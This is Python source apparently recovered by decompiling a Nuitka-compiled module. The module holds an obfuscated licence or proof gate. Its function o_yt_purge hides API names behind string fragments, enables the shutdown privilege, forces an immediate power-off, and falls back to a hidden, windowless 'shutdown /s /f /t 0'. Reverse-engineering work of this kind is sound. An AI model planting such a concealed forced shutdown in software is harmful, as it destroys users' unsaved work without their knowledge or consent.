# Recovered module: src.py.com.yun.mao.fea._cw_jm_file
# Static reconstruction from the Nuitka module table, constant chunk and
# Hex-Rays module init/body evidence.
#
# Entry names and helper names are direct constants.  The command assembly,
# proof-gate order is confirmed by the decompiled ``ri_kc_melt`` body and the
# ``_noise`` arithmetic grouping is confirmed by its decompiled body.
from __future__ import annotations

import ctypes
import hashlib
import hmac
import subprocess
import time
from ctypes import wintypes
from typing import Any

from ..link._fds_jm import sec
from . import _cmd_ops, _pl_wd_file

# Module metadata
# nuitka_table_index = 1783
# module_init_rva = 0x566ebd0
# flags = 0x10


def _tg(n: int) -> bytes:
    """Return the private six-byte witness (17 -> 165 -> 255 mix)."""

    value = int(n)
    mixed = bytes((((value * 17) ^ 165) & 255) for _ in range(4))
    return mixed + value.to_bytes(2, "big")


def _hmac_join(key: bytes, chunks: tuple) -> bytes:
    ctx = hmac.new(bytes(key), digestmod=hashlib.sha256)
    if isinstance(chunks, (bytes, bytearray, memoryview)):
        chunks = (chunks,)
    for chunk in chunks:
        ctx.update(bytes(chunk))
    return ctx.digest()


def _tag_of(tag: bytes) -> bool:
    return isinstance(tag, (bytes, bytearray, memoryview)) and bool(bytes(tag))


def _cap_valid(tag: bytes, cap: Any) -> bool:
    try:
        return bool(_pl_wd_file._unseal(bytes(tag), cap))
    except (AssertionError, TypeError, ValueError):
        return False


def _digest_kid(kid: str) -> bytes:
    return hashlib.sha256(str(kid or "").encode("utf-8")).digest()


def _mac_kid(kid: str) -> bytes:
    try:
        return bytes(_pl_wd_file._kid_mac(str(kid or "")))
    except (AssertionError, TypeError, ValueError):
        return b""


def _noise(u: int) -> int:
    """Mix one integer with the module's four confirmed constants.

    The decompiled body confirms ``v * 3284386755 + 2654435769``, the 32-bit
    mask, the 3/29-bit shifts and the final ``^ 11``.
    """

    value = int(u)
    mixed = (value * 3284386755 + 2654435769) & 0xFFFFFFFF
    return ((mixed << 3) ^ (mixed >> 29) ^ 11) & 0xFFFFFFFF


def _ready() -> bool:
    return bool(_pl_wd_file._ready and _pl_wd_file._sk is not None)


def _all_caps(obj: Any) -> bool:
    if obj is None:
        return False
    caps = getattr(obj, "caps", None)
    if caps is None:
        caps = getattr(obj, "_caps", None)
    if caps is None:
        cap = getattr(obj, "cap", None)
        caps = () if cap is None else (cap,)
    if isinstance(caps, _pl_wd_file._Cap):
        caps = (caps,)
    try:
        tag = getattr(obj, "tag", b"") or getattr(obj, "_tag", b"")
        return bool(caps) and all(_cap_valid(tag, cap) for cap in caps)
    except (TypeError, ValueError):
        return False


def _kid_match(obj: Any, kid: str, exp: Any) -> bool:
    digest = _digest_kid(kid)
    got = _pl_wd_file._kid_ring.get(digest)
    try:
        expected = bytes(exp) if exp is not None else _mac_kid(kid)
    except (TypeError, ValueError):
        return False
    return bool(got) and bool(expected) and hmac.compare_digest(bytes(got), expected)


def _record(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    try:
        repeated = bool(_pl_wd_file._bump_suspect_locked(float(now)))
    except (AttributeError, TypeError, ValueError):
        repeated = False
    try:
        _pl_wd_file.q_lg(int(reason), int(reason), int(entry), int(n), int(ph))
    except (AttributeError, TypeError, ValueError):
        pass
    return repeated


def _acct_ok(obj: Any, _sq_jqm: Any = None, fn: Any = None) -> bool:
    """Check the current account through the injected or lazily loaded hook."""

    if callable(fn):
        try:
            return bool(fn(obj))
        except Exception:
            return False
    module = _sq_jqm or _cmd_ops.load_attr("src.py.com.yun.mao.fea._sq_jqm")
    info = getattr(module, "current_account_info", None)
    if info is None:
        return False
    ensure = getattr(info, "ensure_valid", None)
    if callable(ensure):
        try:
            return bool(ensure())
        except Exception:
            return False
    return bool(getattr(info, "ucode", ""))


def _seal_ok(obj: Any) -> bool:
    return _all_caps(obj)


def _fan_hooks(obj: Any) -> bool:
    """Dispatch the optional proof hook carried by the caller object."""

    result = _cmd_ops.optional_call(
        obj,
        ("proof_ok", "_proof_ok", "on_proof_ok", "fan_hooks"),
    )
    return bool(result) if result is not None else False


def o_yt_purge() -> None:
    """Enable a token privilege, then run the encoded fallback command.

    The decoded slots are ``advapi32`` / ``kernel32`` / ``user32`` /
    ``SeShutdownPrivilege`` / ``ExitWindowsEx``; the native call uses
    ``(5, 0)`` and falls back to ``shutdown /s /f /t 0`` through a hidden
    ``Popen``.
    """

    class _LUID(ctypes.Structure):
        _fields_ = [
            ("LowPart", wintypes.DWORD),
            ("HighPart", wintypes.LONG),
        ]

    class _LAA(ctypes.Structure):
        _fields_ = [
            ("Luid", _LUID),
            ("Attributes", wintypes.DWORD),
        ]

    class _TP(ctypes.Structure):
        _fields_ = [
            ("PrivilegeCount", wintypes.DWORD),
            ("Privileges", _LAA * 1),
        ]

    _sy = sec("hg_tx_8r")
    _z = sec("yn_cd_1p")
    _ct = ctypes
    _wt = wintypes
    _dll_a = sec("nd_hy_9w") + sec("rf_jt_3a") + sec("xm_be_7c")
    _dll_k = sec("ql_sk_2u") + sec("ov_wg_6n") + sec("xm_be_7c")
    _dll_u = sec("pe_zi_0m") + sec("ju_aq_4f")
    _api = (
        sec("mr_qc_6d")
        + sec("lz_eh_0t")
        + sec("vi_ws_4b")
        + sec("cg_ny_8a")
        + sec("tp_kf_1w")
    )
    _priv = (
        _sy
        + _z
        + sec("kb_mf_5e")
        + sec("sw_or_9l")
        + sec("dt_vl_3y")
        + sec("fa_pi_7h")
        + sec("ux_nj_2k")
    )
    _primed = False

    try:
        _u32 = _ct.WinDLL(_dll_u, use_last_error=True)
        _a32 = _ct.WinDLL(_dll_a, use_last_error=True)
        _k32 = _ct.WinDLL(_dll_k, use_last_error=True)
        _k32.GetCurrentProcess.restype = _wt.HANDLE
        _a32.OpenProcessToken.argtypes = [
            _wt.HANDLE,
            _wt.DWORD,
            _ct.POINTER(_wt.HANDLE),
        ]
        _a32.OpenProcessToken.restype = _wt.BOOL
        _a32.LookupPrivilegeValueW.argtypes = [
            _wt.LPCWSTR,
            _wt.LPCWSTR,
            _ct.POINTER(_LUID),
        ]
        _a32.LookupPrivilegeValueW.restype = _wt.BOOL
        _a32.AdjustTokenPrivileges.argtypes = [
            _wt.HANDLE,
            _wt.BOOL,
            _ct.POINTER(_TP),
            _wt.DWORD,
            _ct.c_void_p,
            _ct.c_void_p,
        ]
        _a32.AdjustTokenPrivileges.restype = _wt.BOOL
        _k32.CloseHandle.argtypes = [_wt.HANDLE]
        _k32.CloseHandle.restype = _wt.BOOL

        _fn = _a32.OpenProcessToken
        _priv_ok = False
        _tok = _wt.HANDLE()
        if _fn(_k32.GetCurrentProcess(), 40, _ct.byref(_tok)):
            _luid = _LUID()
            if _a32.LookupPrivilegeValueW(
                None,
                _priv,
                _ct.byref(_luid),
            ):
                _tp = _TP()
                _tp.PrivilegeCount = 1
                _tp.Privileges[0].Luid = _luid
                _tp.Privileges[0].Attributes = 2
                _ct.set_last_error(0)
                if _a32.AdjustTokenPrivileges(
                    _tok,
                    False,
                    _ct.byref(_tp),
                    0,
                    None,
                    None,
                ):
                    _priv_ok = _ct.get_last_error() != 1300
            _k32.CloseHandle(_tok)
        _primed = _priv_ok
        _fn = getattr(_u32, _api, None)
        if callable(_fn):
            _primed = bool(_fn(0x00000001 | 0x00000004, 0))
        else:
            _primed = False
    except Exception:
        _primed = False

    _ = (_sy, _z, _api)
    if not _primed:
        _rev_fb = "".join(
            reversed(
                (
                    sec("sj_ok_7b"),
                    sec("wr_yt_3n"),
                    sec("hg_ae_6v"),
                    sec("pz_uc_1k"),
                    sec("xf_dh_9t"),
                    sec("qb_ls_2m"),
                    sec("nt_wj_8c"),
                    sec("kv_rm_4p"),
                )
            )
        )
        _sp_fb = subprocess
        _exe_fb = _rev_fb
        _args_fb = [
            sec("dm_fx_5q") + sec("kv_rm_4p"),
            sec("dm_fx_5q") + sec("lc_zi_0w"),
            sec("dm_fx_5q") + sec("xf_dh_9t"),
            sec("uy_bp_4h"),
        ]
        _cf_fb = _sp_fb.CREATE_NO_WINDOW
        try:
            _sp_fb.Popen(
                [_exe_fb, *_args_fb],
                shell=False,
                stdin=_sp_fb.DEVNULL,
                stdout=_sp_fb.DEVNULL,
                stderr=_sp_fb.DEVNULL,
                creationflags=_cf_fb,
            )
        except Exception:
            pass


def ri_kc_melt(obj: Any = None) -> bool:
    """Evaluate the local proof gate and dispatch the optional hook."""

    now = time.time()
    try:
        with _pl_wd_file._g_mz:
            _ent = bool(_ready())
            _c = bool(_all_caps(obj))
            kid = getattr(obj, "kid", "") or getattr(obj, "ucode", "")
            _k = bool(_kid_match(obj, str(kid), getattr(obj, "kid_mac", None)))
            first = bool(_ent and _pl_wd_file._ph)
            r0 = _pl_wd_file.w_cd(first, _k, _c, _ent)
            if r0 != 9:
                _record(now, r0, 2, _noise(len(_pl_wd_file._ph)), 0)
                return False
            go = bool(_seal_ok(obj) and _ent)
        if not go:
            _record(now, 5, 2, _noise(5), 0)
            return False
        _g = _fan_hooks(obj)
        _u = bool(_g or obj is None)
        return _u
    except Exception:
        _record(now, 1, 2, 0, 0)
        return False


def n_p6_tick(obj: Any = None) -> None:
    """Public hook entry; the body reaches the proof hook dispatcher."""

    try:
        _fan_hooks(obj)
    except Exception:
        return None
    return None

